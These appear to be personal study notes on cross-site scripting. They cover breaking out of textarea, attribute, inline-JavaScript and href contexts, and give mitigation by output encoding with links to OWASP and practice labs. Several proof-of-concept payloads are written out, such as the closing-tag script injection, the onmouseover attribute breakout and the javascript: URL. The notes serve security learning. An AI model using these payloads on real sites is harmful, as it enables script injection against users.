When you think of XSS most of the time, response body should come to your mind as 99% of XSS happens through HTTP response body

When you make a request to a website, mainly 3 different type of files are returned: HTML, CSS and, JS files

#### Quick test for XSS using 
```
test'"><
```

XSS is basically a browser manipulation.

#### Closing tags before injecting the XSS

Sometimes, when the XSS injection is in a tag (ex: `<textarea>`), the browser might not execute the script. Therefore, you need to close the tag first:

Here this XSS Injection **does not work** as the browser does not understand. To confirm this,  you need to look at the page source code

```html
<!-- ❌ Not Working XSS Injection -->
<html>
	<body>
		<textarea>
			Hello, <script>alert(1)</script>
		</textarea>
	</body>
</html>
```

```html
<!-- ✅ Working XSS Injection -->
<html>
	<body>
		<textarea>
			Hello, </textarea><script>alert(1)</script>
		</textarea>
	</body>
</html>
```


> [!NOTE] HTML Context `< >`
> HTML Context "`< >`" is very important when it comes to XSS as without it you can't do XSS

## Attribute Context

Imagine you are submitting a form and your payload goes here
```html
<html>
	<body>
		<form>
			<input name="keyword" value="<script>alert(1)</script>">
		</form>
	</body>
</html>
```

The payload above **won't work** as your injection is stuck inside the value
You have to first look at where you are (or will be after submitting form)
For your XSS Injection to work, you first have to go back to HTML context (outside of input value)

```html
<html>
	<body>
		<form>
		<input name="keyword" value=""&gt;&lt;script&gt;alert(1)&lt;/script&gt; ">
		</form>
	</body>
</html>
```

Or even better
```html
<html>
	<body>
		<form>
		<input name="keyword" value=" " onmouseover="alert(1)">
		</form>
	</body>
</html>
```

> [!info] IE version 8 and below XSS trick
> For IE version 8 (or 9) and below, backticks cause the attribute string to end
> ```html
> <input name="keyword" value=""`` >
> ```

In Total there are about 29 Contexts

## JSINLINE Context

```http
www.x.com/?id=alert(1)
```

```html
<html>
	<body>
		<input type="button" onclick="saveForm(alert(1))">
	</body>
</html>
```

## HREF Context

If in some way, user data is in a link tag `href` like this
```html
<html>
	<body>
		<a href="USER_DATA">click me</a>
	</body>
</html>
```

then you can try doing this:
```html
<html>
	<body>
		<a href="javascript:alert(1)">click me</a>
	</body>
</html>
```

> [!attention] `javascript:alert(1)`
> `javascript:alert(1)` only works in `href` attribute of `<a>` tag

## XSS types:

1) [[Reflected XSS]]
2) [[Stored XSS]]
3) [[Self XSS]]
4) [[DOM XSS]]


## Mitigation
You have to encode HTML Context (`< >`) characters
Meaning:
`<` = `&lt;`
`>` = `&gt;`

INPUT VALIDATION
OUTPUT ENCODING

```html
<html>
	<body>
		<a href="{{ encoder.HrefContextEncoder($untrusted_data) }}">click me</a>
	</body>
</html>
```

## Related links:

Also look at [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

Check out these important videos by mdisec to learn more:
1) [XSS Part 1](https://youtu.be/NFD3vZ-lIgI?list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT)
2) [XSS Part 2](https://youtu.be/xXbDhyKo9B8)
3) [Solving XSS expert lab DOM clobbering](https://youtu.be/Cy9qGc_A_Ic?list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT)

XSS Exercises:
1) Google XSS Challenge
2) [Public Firing Range](https://public-firing-range.appspot.com/) (Study XSS Contexts here)
3) [Prompt.ml](https://prompt.ml/0)
